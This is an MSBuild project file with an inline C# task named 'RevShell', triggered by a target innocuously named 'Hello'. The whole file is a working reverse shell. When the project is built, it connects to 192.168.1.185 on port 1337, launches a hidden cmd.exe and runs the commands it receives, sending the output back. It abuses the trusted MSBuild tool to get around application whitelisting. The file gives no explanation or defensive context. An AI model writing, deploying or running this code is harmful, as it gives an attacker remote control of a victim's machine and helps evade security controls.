<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
    <UsingTask
      TaskName="RevShell"
      TaskFactory="RoslynCodeTaskFactory"
      AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.Core.dll" >
      <ParameterGroup />
      <Task>
        <Using Namespace="System"/>
        <Using Namespace="System.IO"/>
    <Using Namespace="System.Text"/>
    <Using Namespace="System.Diagnostics"/>
    <Using Namespace="System.Net.Sockets"/>
        <Code Type="Fragment" Language="cs">
  <![CDATA[
StreamWriter streamWriter;
using(TcpClient client = new TcpClient("192.168.1.185", 1337))
{
    using(Stream stream = client.GetStream())
    {
        using(StreamReader rdr = new StreamReader(stream))
        {
            streamWriter = new StreamWriter(stream);
            StringBuilder strInput = new StringBuilder();
            Process p = new Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardInput = true;
            p.StartInfo.RedirectStandardError = true;
            p.OutputDataReceived += (sendingProcess, outLine) =>
            {
                if (!String.IsNullOrEmpty(outLine.Data))
                {
                    try
                    {
                        streamWriter.WriteLine(outLine.Data);
                        streamWriter.Flush();
                    }
                    catch (Exception err) { }
                }
            };
            p.ErrorDataReceived += (sendingProcess, outLine) => {
                if (!String.IsNullOrEmpty(outLine.Data))
                {
                    try
                    {
                        streamWriter.WriteLine(outLine.Data);
                        streamWriter.Flush();
                    }
                    catch (Exception err) { }
                }
            };
            p.Start();
            p.BeginOutputReadLine();
            while(true)
            {
                strInput.Append(rdr.ReadLine());
                p.StandardInput.WriteLine(strInput);
                strInput.Remove(0, strInput.Length);
            }
        }
    }
}
  ]]>
        </Code>
      </Task>
    </UsingTask>
     <Target Name="Hello">
      <RevShell />
    </Target>
  </Project>
